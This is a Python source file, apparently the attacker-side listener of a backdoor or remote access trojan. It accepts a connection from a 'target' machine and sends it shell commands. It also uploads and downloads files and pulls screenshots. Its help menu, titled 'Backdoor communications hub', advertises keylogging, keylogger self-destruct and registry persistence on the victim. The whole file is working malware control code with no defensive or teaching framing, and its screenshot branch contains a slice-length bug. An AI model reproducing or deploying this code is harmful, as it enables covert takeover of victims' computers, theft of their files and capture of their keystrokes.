
import socket
from termcolor import colored
import json
import os


def reliable_receive():
    data = ''
    while True:
        try:
            data = data + target.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue


def reliable_send(data):
    jsondata = json.dumps(data)
    target.send(jsondata.encode())


def upload_file(filename):
    f = open(filename, 'rb')
    target.send(f.read())


def download_file(filename):
    f = open(filename, 'wb')
    target.settimeout(1)
    chunk = target.recv(1024)
    while chunk:
        f.write(chunk)
        try:
            chunk = target.recv(1024)
        except socket.timeout:
            break
    target.settimeout(None)
    f.close()


def Target_communication():
    count = 0
    while True:
        command = input('* Shell~%s: ' % str(ip))
        reliable_send(command)
        if command == 'quit':
            sock.close()
            break
        elif command == 'clear':
            os.system('clear')
        elif command[:3] == 'cd ':
            pass
        elif command[:6] == 'upload':
            upload_file(command[7:])
        elif command[:8] == 'download':
            download_file(command[9:])
        elif command[:9] == 'screenshot':
            f = open('screenshot %e' % count, 'wb')
            target.settimeout(3)
            chunk = target.recv(1024)
            while chunk:
                f.write(chunk)
                try:
                    chunk = target.recv(1024)
                except socket.timeout:
                    break
            target.settimeout(None)
            f.close()
            count += 1
        elif command == 'help':
            print(colored('''\n
            <----- Backdoor communications hub ----->\n
             quit                               --> Quits the session with the target
             clear                              --> Clear the screen
             cd*Directory name                  --> Changes the directory on the target system
             upload *filename*                  --> Upload file to target machine 
             download *filename*                --> Download file to target machine
             keylog_start                       --> Start keylogger
             keylog_dump                        --> Dump keylogger
             keylog_stop                        --> Stop and self destruct keylogger
             persistence *Regname* *filename*   --> Create persistence in registry
             ''', 'green'))
        else:
            result = reliable_receive()
            print(result)


sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind(('127.0.0.1', 5555))
print(colored('[+] Listening for incoming connections', 'green'))
sock.listen(5)
target, ip = sock.accept()
print(colored(f'[+] target connected from: {str(ip)}', 'green'))
Target_communication()
